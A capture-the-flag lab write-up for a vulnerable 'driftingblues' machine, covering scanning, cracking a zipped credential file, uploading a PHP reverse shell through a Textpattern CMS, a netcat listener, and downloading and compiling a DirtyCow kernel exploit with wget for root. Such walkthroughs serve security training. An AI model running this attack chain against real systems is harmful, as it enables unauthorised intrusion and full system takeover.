# [Recon]

```
=========================================================================
[OS]: Ubuntu
[Web-Technology]: Apache httpd 2.2.22
[Hostname]: driftingblues
[IP]:  192.168.209.219
[USERS]: Null
[CREDENTIALS]: mayer:lionheart
=========================================================================
```
-----------------------------------------------------------------------------

# [Scanning and Enumeration]

	[NMAP]

```

80/tcp open  http    syn-ack Apache httpd 2.2.22 ((Debian))
|_http-title: driftingblues
|_http-server-header: Apache/2.2.22 (Debian)
| http-methods: 
|_  Supported Methods: GET HEAD POST OPTIONS
| http-robots.txt: 1 disallowed entry 
|_/textpattern/textpattern
```

	[Web Enumeration]

```
--> Files
/robots.txt
/dp.png

--> Directories
/
/textpattern/textpattern/
/files/
/spammer
```

```
--> NITKO
- Nikto v2.5.0
---------------------------------------------------------------------------
+ Target IP:          192.168.156.219
+ Target Hostname:    192.168.156.219
+ Target Port:        80
+ Start Time:         2024-08-25 09:46:27 (GMT1)
---------------------------------------------------------------------------
+ Server: Apache/2.2.22 (Debian)
+ /: Server may leak inodes via ETags, header found with file /, inode: 14067, size: 750, mtime: Mon Mar 15 14:36:18 2021. See: http://cve.mitre.org/cgi-bin/cvename.cgi?name=CVE-2003-1418
+ /: The anti-clickjacking X-Frame-Options header is not present. See: https://developer.mozilla.org/en-US/docs/Web/HTTP/Headers/X-Frame-Options
+ /: The X-Content-Type-Options header is not set. This could allow the user agent to render the content of the site in a different fashion to the MIME type. See: https://www.netsparker.com/web-vulnerability-scanner/vulnerabilities/missing-content-type-header/
+ /textpattern/textpattern/: Cookie txp_test_cookie created without the httponly flag. See: https://developer.mozilla.org/en-US/docs/Web/HTTP/Cookies
+ /textpattern/textpattern/: Retrieved x-powered-by header: PHP/5.5.38-1~dotdeb+7.1.
+ /robots.txt: Entry '/textpattern/textpattern/' is returned a non-forbidden or redirect HTTP code (200). See: https://portswigger.net/kb/issues/00600600_robots-txt-file
+ /robots.txt: contains 1 entry which should be manually viewed. See: https://developer.mozilla.org/en-US/docs/Glossary/Robots.txt
+ /index: Uncommon header 'tcn' found, with contents: list.
+ /index: Apache mod_negotiation is enabled with MultiViews, which allows attackers to easily brute force file names. The following alternatives for 'index' were found: index.html. See: http://www.wisec.it/sectou.php?id=4698ebdc59d15,https://exchange.xforce.ibmcloud.com/vulnerabilities/8275
+ Apache/2.2.22 appears to be outdated (current is at least Apache/2.4.54). Apache 2.2.34 is the EOL for the 2.x branch.
+ ERROR: Error limit (20) reached for host, giving up. Last error: 
+ Scan terminated: 1 error(s) and 10 item(s) reported on remote host
+ End Time:           2024-08-25 09:53:33 (GMT1) (426 seconds)
```

With all the above results,  the `/textpattern` seems to be a static web page that has nothing in it 
![[Pasted image 20240825123309.png]]
Also i noticed that the `/textpattern/textpattern/` endpoint is just a login page that requires a `username` and a `password`. I tried googling `Textpattern CMS default Creds` but nothing special.

![[Pasted image 20240825124138.png]]


the most interesting part it this `/spammer` endpoint which contains a `spammer.zip` file. and i downloaded the file and try to extract it but it is password protected.

![[Pasted image 20240825124526.png]]

```bash
unzip spammer.zip
zip2john spammer.zip > forjohn.txt
john forjohn.txt        # myspace4
unzip spammer.zip
```

And Boom there we go, we are able to obtain the login credential of `mayer:lionheart` which we can then use to login into the application. After loggin in i move around the `CMS` to look for things that can help me establish a reverse connection to my local system and without wasting much of the time i got it.

![[Pasted image 20240825122355.png]]

I uploaded a `php-reverse-shell.php` script and its works just fine without any error. We now, How do i trigger the payload i just uploaded. I need to figure out another endpoint that allows me to see where the exact location of the file i just uploaded. 


![[Pasted image 20240825122509.png]]

I have to `FUZZ` the `/textpattern/` endpoint. Then the result is as follows :arrowdown
![[Pasted image 20240825165311.png]]
 and on visiting the site via a browser. i do have access to the uploaded file and now all i have to do is just to trigger the payload by clicking on the `php-reverse-shell.php`. 

![[Pasted image 20240825122622.png]]

**Start up a Listener Locally  and Trigger the payload**
```bash
nc -lnvp 9001
```
![[Pasted image 20240825122916.png]]
# [Privilege-Escalation]

--> At this point, I tried lateral movement and basic privesc techniques to uncover more information but end up with nothing. So i decided to upload `linpeas.sh`. Upon uploading the linpeas.sh file and running it, Here we go lots and lots of vulnerabilities mostly `kernel exploits`. 

![[Pasted image 20240825113802.png]]
So i took the first one and did a google search [DirtyCow](https://www.exploit-db.com/exploits/40839) Copy the C code and save it locally as `dirtycow.c`. 
```bash
cd /var/tmp
wget http://192.168.45.224:8000/dirtycow.c
gcc -pthread dirtycow.c -o dirty -lcrypt
chmod +x dirty
./dirty   # password: password
su firefart
```

![[Pasted image 20240825120445.png]]

# [Take away Concept]
```
=========================================================================
* Always use different tools for the job
* look for CVEs related information [linpeas result]

=========================================================================
```

# [Flags]

`local.txt : `
`proof.txt : ae8a61b0de732ab2fe5217e608255a93`